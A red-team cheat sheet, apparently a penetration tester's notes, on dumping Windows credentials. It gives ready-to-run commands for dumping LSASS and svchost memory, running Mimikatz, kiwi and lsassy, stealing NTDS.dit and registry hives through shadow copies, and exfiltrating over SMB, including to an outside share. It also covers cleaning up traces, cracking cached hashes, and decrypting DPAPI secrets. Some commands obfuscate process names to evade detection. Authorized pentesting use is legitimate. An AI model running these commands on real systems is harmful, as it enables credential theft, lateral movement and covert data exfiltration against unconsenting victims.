# Credentials Dump




## lsass.exe



### LOLBAS


#### comsvcs.dll

* [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz#comsvcs-dll](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz#comsvcs-dll)

```
PS > $proc = 'ls'+'Ass'
PS > Get-Process $proc
PS > rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PROCESS_PID> C:\Windows\System32\spool\drivers\color\pony.dat full
```

Not touching the disk (using an SMB share):

```
PS > net use z: \\10.10.13.37\share
PS > rundll32.exe c:\Windows\System32\comsvcs.dll, MiniDump (Get-Process ('ls'+'Ass')).id z:\pony.dat full
```


#### ProcDump

* [https://docs.microsoft.com/en-us/sysinternals/downloads/procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)
* [https://download.sysinternals.com/files/Procdump.zip](https://download.sysinternals.com/files/Procdump.zip)

Dump and parse:

```
PS > .\procdump64.exe -accepteula -64 -ma lsass.exe lsass.dmp
$ pypykatz lsa minidump lsass.dmp > lsass-pypykatz.minidump
Or
Cmd > .\mimikatz.exe "sekurlsa::minidump out.txt" "exit"
```

Grep for secrets:

```
 # Mimikatz
$ grep '* Username : ' out.txt -A2 | grep -e Username -e Password -e NTLM | grep -v null | xclip -i -sel c
 # Pypykatz
$ grep -P '\tusername ' out.txt -A2 | grep -e username -e password | grep -v None | xclip -i -sel c
$ grep -P 'Username: ' out.txt -A4 | grep -e Username -e Domain -e NT | grep -v None | xclip -i -sel c
```


#### Silent Process Exit

* [https://www.deepinstinct.com/2021/02/16/lsass-memory-dumps-are-stealthier-than-ever-before-part-2/](https://www.deepinstinct.com/2021/02/16/lsass-memory-dumps-are-stealthier-than-ever-before-part-2/)
* [https://github.com/deepinstinct/LsassSilentProcessExit](https://github.com/deepinstinct/LsassSilentProcessExit)



### Mimikatz

In case of Windows 10 version 1803-1809 use [Mimikatz v2.1.1](https://github.com/gentilkiwi/mimikatz/files/4167347/mimikatz_trunk.zip), see [Key import error](https://github.com/gentilkiwi/mimikatz/issues/248):

```
Cmd > .\mimikatz.exe "privilege::debug" "log out.txt" "sekurlsa::logonpasswords full" "exit"
```


#### kiwi

```
meterpreter > getsystem
meterpreter > load kiwi
meterpreter > creds_msv
meterpreter > creds_all
meterpreter > lsa_dump_secrets
meterpreter > kiwi_cmd '"privilege::debug" "sekurlsa::logonpasswords full" "exit"'
```



### Reusing Open Handles

* [https://github.com/jfmaes/SharpHandler](https://github.com/jfmaes/SharpHandler)


#### Pypykatz

* [https://skelsec.medium.com/duping-av-with-handles-537ef985eb03](https://skelsec.medium.com/duping-av-with-handles-537ef985eb03)
* [https://github.com/skelsec/pypykatz/releases/latest](https://github.com/skelsec/pypykatz/releases/latest)

```
$ .\pypykatz.exe live lsa --method handledup
```



### Remotely

* [https://github.com/G0ldenGunSec/SharpSecDump](https://github.com/G0ldenGunSec/SharpSecDump)


#### lsassy

* [https://github.com/Hackndo/lsassy](https://github.com/Hackndo/lsassy)
* [https://github.com/byt3bl33d3r/CrackMapExec/blob/master/cme/modules/lsassy.py](https://github.com/byt3bl33d3r/CrackMapExec/blob/master/cme/modules/lsassy.py)
* [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/)

```
$ lsassy 10.10.13.0/24 -d megacorp.local -u snovvcrash -p 'Passw0rd!'
$ cme smb 10.10.13.0/24 -u snovvcrash -p 'Passw0rd!' -M lsassy
```




## svchost.exe

* [https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/](https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/)

Locate the svchost.exe process that's holding RDP creds:

```
Cmd > tasklist /M:rdpcorets.dll
```

Use ProcDump or comsvc.dll to dump process memory:

```
Cmd > .\procdump64.exe -accepteula -64 -ma <PROCESS_PID> svchost.dmp
Cmd > rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <PROCESS_PID> C:\Windows\Temp\svchost.dmp full
```

Grep for plaintext passwords:

```
$ strings -el svchost.dmp | grep <USERNAME> -C1
```



### Mimikatz

```
Cmd > .\mimikatz.exe "privilege::debug" "log out.txt" "ts::logonpasswords" "exit"
```




## SAM



### Mimikatz

```
PS > Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "log out.txt" "lsadump::sam" "exit"'
```




## NTDS + SAM

Locate `diskshadow.exe`:

```
cmd /c where /R C:\ diskshadow.exe
```

Create shadow volume:

```
powershell -c "Add-Content add_vol.txt 'set context persistent nowriters'"
powershell -c "Add-Content add_vol.txt 'set metadata C:\Windows\Temp\meta.cab'"
powershell -c "Add-Content add_vol.txt 'set verbose on'"
powershell -c "Add-Content add_vol.txt 'begin backup'"
powershell -c "Add-Content add_vol.txt 'add volume c: alias DCROOT'"
powershell -c "Add-Content add_vol.txt 'create'"
powershell -c "Add-Content add_vol.txt 'expose %DCROOT% w:'"
powershell -c "Add-Content add_vol.txt 'end backup'"
cmd /c diskshadow.exe /s add_vol.txt
```

```
// add_vol.txt
set context persistent nowriters
set metadata C:\Windows\Temp\meta.cab
set verbose on
begin backup
add volume c: alias DCROOT
create
expose %DCROOT% w:
end backup
```

Exfiltrate over SMB:

```
mkdir C:\smb_pentest
copy w:\Windows\NTDS\ntds.dit C:\smb_pentest\ntds.dit
cmd /c reg.exe save hklm\system C:\smb_pentest\system.hive
cmd /c reg.exe save hklm\sam C:\smb_pentest\sam.hive
cmd /c reg.exe save hklm\security C:\smb_pentest\security.hive
cmd /c net share pentest=c:\smb_pentest /GRANT:"Everyone,FULL"

$ smbclient.py 'snovvcrash:Passw0rd!@127.0.0.1'
> use pentest
> get ntds.dit
> get system.hive
> get sam.hive
> get security.hive
```

Delete shadow volume:

```
powershell -c "Add-Content delete_vol.txt 'set context persistent nowriters'"
powershell -c "Add-Content delete_vol.txt 'set metadata C:\Windows\Temp\meta.cab'"
powershell -c "Add-Content delete_vol.txt 'set verbose on'"
powershell -c "Add-Content delete_vol.txt 'unexpose w:'"
powershell -c "Add-Content delete_vol.txt 'delete shadows volume c:'"
powershell -c "Add-Content delete_vol.txt 'reset'"
cmd /c diskshadow.exe /s delete_vol.txt
```

```
// delete_vol.txt
set context persistent nowriters
set metadata C:\Windows\Temp\meta.cab
set verbose on
unexpose w:
delete shadows volume c:
reset
```

Clean up:

```
cmd /c net share pentest /delete
rm -re -fo C:\smb_pentest
rm C:\Windows\Temp\meta.cab
rm add_vol.txt
rm delete_vol.txt
```

Parse secrets:

```
$ secretsdump.py [-pwd-last-set] [-user-status] [-history] -sam sam.hive -system system.hive -security security.hive -ntds ntds.dit LOCAL
```




## MSCash2/MSCache2 (DCC2)

* [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsa-secrets](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsa-secrets)
* [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-and-cracking-mscash-cached-domain-credentials](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-and-cracking-mscash-cached-domain-credentials)



### Dump

Domain cached credentials are stored within [LSA secrets](https://www.passcape.com/index.php?section=docsys&cmd=details&id=23) in `HKLM:\SECURITY` registry hive.

Export registry hives and extract cached creds locally with `secretsdump.py` or [mscache.py](https://github.com/QAX-A-Team/mscache/blob/master/mscache.py):

```
Cmd > reg save hklm\system system.hive
Cmd > reg save hklm\security security.hive
$ secretsdump.py -system system.hive -security security.hive LOCAL
Or
$ python mscache.py --system system.hive --security security.hive
```



### Crack

```
$ hashcat -m 2100 -O -a 0 -w 4 --session=dcc2 -o dcc2.out dcc2.in seclists/Passwords/darkc0de.txt -r rules/d3ad0ne.rule
```




## DPAPI

Master keys locations (hidden files, need `-Force`):

```
PS > ls -fo C:\Users\snovvcrash\AppData\Roaming\Microsoft\Protect\ (%appdata%\Microsoft\Protect\)
PS > ls -fo C:\Users\snovvcrash\AppData\Local\Microsoft\Protect\ (%localappdata%\Microsoft\Protect\)
```

Credential files locations (hidden files, need `-Force`):

```
PS > ls -fo C:\Users\snovvcrash\AppData\Roaming\Microsoft\Credentials\ (%appdata%\Microsoft\Credentials\)
PS > ls -fo C:\Users\snovvcrash\AppData\Local\Microsoft\Credentials\ (%localappdata%\Microsoft\Credentials\)
```

Unhide files:

```
PS > cmd /c "attrib -h -s 00ff00ff-00ff-00ff-00ff-00ff00ff00ff
PS > cmd /c "attrib -h -s 00ff00ff00ff00ff00ff00ff00ff00ff"
```



### Mimikatz

* [https://www.harmj0y.net/blog/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/](https://www.harmj0y.net/blog/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/)

Decrypt manually offline with known plaintext password:

```
mimikatz # dpapi::masterkey /in:00ff00ff-00ff-00ff-00ff-00ff00ff00ff /sid:S-1-5-21-4124311166-4116374192-336467615-500 /password:Passw0rd!
mimikatz # dpapi::cache
mimikatz # dpapi::cred /in:00ff00ff00ff00ff00ff00ff00ff00ff
```



### SharpDPAPI

* [https://github.com/GhostPack/SharpDPAPI](https://github.com/GhostPack/SharpDPAPI)
* [https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-SharpDPAPI.ps1](https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-SharpDPAPI.ps1)

```
PS > .\SharpDPAPI.exe triage /password:Passw0rd!
PS > .\SharpDPAPI.exe machinetriage [/password:Passw0rd!]
```




## Credential Manager



### Mimikatz

```
Cmd > .\mimikatz.exe "privilege::debug" "log out.txt" "vault::cred /patch" "exit"
```




## master.mdf

* [https://xpnsec.tumblr.com/post/145350063196/reading-mdf-hashes-with-powershell](https://xpnsec.tumblr.com/post/145350063196/reading-mdf-hashes-with-powershell)
* [https://github.com/xpn/Powershell-PostExploitation/tree/master/Invoke-MDFHashes](https://github.com/xpn/Powershell-PostExploitation/tree/master/Invoke-MDFHashes)
* [https://www.nucleustechnologies.com/blog/mdf-file-location-in-sql-server-2014-2016-2017/](https://www.nucleustechnologies.com/blog/mdf-file-location-in-sql-server-2014-2016-2017/)

```
PS > Get-MDFHashes -mdf C:\Invoke-MDFHashes\master.mdf
```




## Tools



### LaZagne

* [https://github.com/AlessandroZ/LaZagne](https://github.com/AlessandroZ/LaZagne)

```
Cmd > .\lazagne.exe all
Cmd > .\lazagne.exe windows
```
